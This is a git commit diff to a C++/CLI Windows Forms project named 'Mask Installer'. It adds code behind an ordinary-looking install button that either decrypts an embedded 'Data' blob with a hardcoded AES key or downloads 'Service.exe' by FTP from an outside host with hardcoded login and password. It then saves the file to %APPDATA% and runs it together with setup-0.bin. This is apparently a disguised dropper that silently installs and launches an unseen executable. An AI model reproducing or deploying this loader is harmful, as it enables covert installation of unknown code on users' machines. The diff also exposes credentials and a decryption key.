3919836b619d5b995f6fa928b3ade1ac549da07f
Yury <xismatulin.ru@yandex.ru>
2018-06-28 18:14:17 +0500

    Mask Installer в рабочем состоянии

--- Masks/Installer/Project2/MyForm.cpp
+++ Masks/Installer/Project2/MyForm.cpp
@@ -1,52 +1,18 @@
 #include "MyForm.h"
-#include <windows.h>
-#include <stdio.h>
-#include <fcntl.h>
-#include <io.h>
 #include <iostream>
 #include <stdio.h>
 #include <Windows.h>
-#include <WinInet.h>
-#include <conio.h>
 
-using std::cout;
-using std::cin;
-using std::endl;
 using namespace Project2;
 
-#pragma comment (lib, "wininet.lib")
-
-void upload(LPCSTR server, LPCSTR login, LPCSTR pass, LPCWSTR local_file, LPCWSTR remote_file)
-{
-	HINTERNET hOpen, hConnection;
-
-	hOpen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-
-	hConnection = InternetConnectA(hOpen, server, INTERNET_DEFAULT_FTP_PORT, login, pass, INTERNET_SERVICE_FTP, 0, 0);
-
-	if (FtpGetFile(hConnection, local_file, remote_file, 0, 0, 0, 0))
-		cout << "Success Story" << endl;
-	else
-		cout << "Epic Fail!" << endl;
-
-	InternetCloseHandle(hConnection);
-	InternetCloseHandle(hOpen);
-}
 
 [STAThreadAttribute]
-int main(array <System::String ^> ^args)
+int main()
 {
 	Application::EnableVisualStyles();
 	Application::SetCompatibleTextRenderingDefault(false);
 
-	upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", L"Service.exe");
-	CopyFile(L"Data", L"Data.exe", false);
-
-	//TODO: Ðאסרטפנמגאעü פאיכ
-
-	//LPCTSTR path = L"Service.exe";
-	//ShellExecute(NULL, L"open", path, NULL, NULL, SW_SHOWDEFAULT);
-
 	Application::Run(gcnew MyForm());
 	return 0;
 }
+
--- Masks/Installer/Project2/MyForm.h
+++ Masks/Installer/Project2/MyForm.h
@@ -4,6 +4,24 @@
 #include <io.h>
 #include <winuser.h>
 
+#include <stdio.h>
+#include <fcntl.h>
+#include <iostream>
+#include <stdio.h>
+#include <WinInet.h>
+#include <conio.h>
+#include <wincrypt.h>
+#include <Shlobj.h>
+#include <Userenv.h>
+
+
+#pragma comment (lib, "wininet.lib")
+#pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "Advapi32.lib")
+
+#define BLOCK_LEN 128
+
+
 namespace Project2 {
 
 	using namespace System;
@@ -13,6 +31,7 @@ namespace Project2 {
 	using namespace System::Windows::Forms;
 	using namespace System::Data;
 	using namespace System::Drawing;
+	using namespace std;
 
 	/// <summary>
 	/// Сводка для MyForm
@@ -120,14 +139,197 @@ namespace Project2 {
 
 		}
 #pragma endregion
+
+
+		const wchar_t *GetWC(const char *c)
+		{
+			const size_t cSize = strlen(c) + 1;
+			wchar_t* wc = new wchar_t[cSize];
+			mbstowcs(wc, c, cSize);
+
+			return wc;
+		}
+
+		void upload(LPCSTR server, LPCSTR login, LPCSTR pass, LPCWSTR local_file, LPCWSTR remote_file)
+		{
+			HINTERNET hOpen, hConnection;
+
+			hOpen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+
+			hConnection = InternetConnectA(hOpen, server, INTERNET_DEFAULT_FTP_PORT, login, pass, INTERNET_SERVICE_FTP, 0, 0);
+
+			if (FtpGetFile(hConnection, local_file, remote_file, 0, 0, 0, 0))
+				cout << "Success Story" << endl;
+			else
+				cout << "Epic Fail!" << endl;
+
+			InternetCloseHandle(hConnection);
+			InternetCloseHandle(hOpen);
+		}
+
+		int DeCrypt()
+		{
+			LPCWSTR inFilename = L"Data";
+			LPCWSTR key_str = L"3igcZhRdWq96m3GUmTAiv9";
+
+			string buf = GetNewFile();
+			wstring stemp = wstring(buf.begin(), buf.end());
+			LPCWSTR outFilename = stemp.c_str();
+
+			size_t len = lstrlenW(key_str);
+
+			HANDLE hInpFile = CreateFileW(inFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+			if (hInpFile == INVALID_HANDLE_VALUE) {
+				printf("Cannot open input file!\n");
+				system("pause");
+				return (-1);
+			}
+			HANDLE hOutFile = CreateFileW(outFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (hOutFile == INVALID_HANDLE_VALUE) {
+				printf("Cannot open output file!\n");
+				system("pause");
+				return (-1);
+			}
+
+			DWORD dwStatus = 0;
+			BOOL bResult = FALSE;
+			wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
+			HCRYPTPROV hProv;
+			if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+				dwStatus = GetLastError();
+				printf("CryptAcquireContext failed: %x\n", dwStatus);
+				CryptReleaseContext(hProv, 0);
+				system("pause");
+				return dwStatus;
+			}
+			HCRYPTHASH hHash;
+			if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+				dwStatus = GetLastError();
+				printf("CryptCreateHash failed: %x\n", dwStatus);
+				CryptReleaseContext(hProv, 0);
+				system("pause");
+				return dwStatus;
+			}
+
+			if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
+				DWORD err = GetLastError();
+				printf("CryptHashData Failed : %#x\n", err);
+				system("pause");
+				return (-1);
+			}
+			printf("[+] CryptHashData Success\n");
+
+			HCRYPTKEY hKey;
+			if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
+				dwStatus = GetLastError();
+				printf("CryptDeriveKey failed: %x\n", dwStatus);
+				CryptReleaseContext(hProv, 0);
+				system("pause");
+				return dwStatus;
+			}
+			printf("[+] CryptDeriveKey Success\n");
+
+			const size_t chunk_size = BLOCK_LEN;
+			BYTE chunk[chunk_size] = { 0 };
+			DWORD out_len = 0;
+
+			BOOL isFinal = FALSE;
+			DWORD readTotalSize = 0;
+
+			DWORD inputSize = GetFileSize(hInpFile, NULL);
+
+			while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
+				if (0 == out_len) {
+					break;
+				}
+				readTotalSize += out_len;
+				if (readTotalSize == inputSize) {
+					isFinal = TRUE;
+					printf("Final chunk set.\n");
+				}
+
+				if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
+					printf("[-] CryptDecrypt failed\n");
+					break;
+				}
+
+				DWORD written = 0;
+				if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
+					printf("writing failed!\n");
+					break;
+				}
+				memset(chunk, 0, chunk_size);
+			}
+
+			CryptReleaseContext(hProv, 0);
+			CryptDestroyKey(hKey);
+			CryptDestroyHash(hHash);
+
+			CloseHandle(hInpFile);
+			CloseHandle(hOutFile);
+			printf("Finished. Processed %#x bytes.\n", readTotalSize);
+			system("pause");
+			return 0;
+		}
+
 	private: System::Void checkBox1_CheckedChanged(System::Object^  sender, System::EventArgs^  e) 
 	{
-		button2->Enabled = true;
+		button2->Enabled = checkBox1->Checked;
 	}
 	private: System::Void button2_Click(System::Object^  sender, System::EventArgs^  e) 
 	{
+		string file = GetNewFile();
+		if (System::IO::File::Exists("Data"))
+		{
+			DeCrypt();
+		}
+		else
+		{
+			try
+			{
+				
+				wstring stemp = wstring(file.begin(), file.end());
+				upload("fokes1.asuscomm.com", "ff", "WorkerFF", stemp.c_str(), L"Service.exe");
+			}
+			catch(exception ex)
+			{
 
+			}
+		}
+	
+		WinExec(file.c_str(), SW_SHOW);
+		WinExec("setup-0.bin", SW_SHOW);
+		//ShellExecute(NULL, L"open", stemp.c_str(), NULL, NULL, SW_SHOWDEFAULT);
+	}
+	
+	private: std::string GetNewFile()
+	{
+		std::string file;
+		try
+		{
+#pragma warning(disable : 4996)
+			file.append(getenv("APPDATA"));
 
+			if (strlen(file.c_str()) == 0)
+			{
+				if (System::IO::Directory::Exists("C:\\"))
+				{
+					file.clear();
+					file.append("C:\\");
+				}
+			}
+		}
+		catch (exception ex)
+		{
+			if (System::IO::Directory::Exists("C:\\"))
+			{
+				file.clear();
+				file.append("C:\\");
+			}
+		}
+		file.append("\\Service.exe");
+
+		return file;
 	}
 
 };
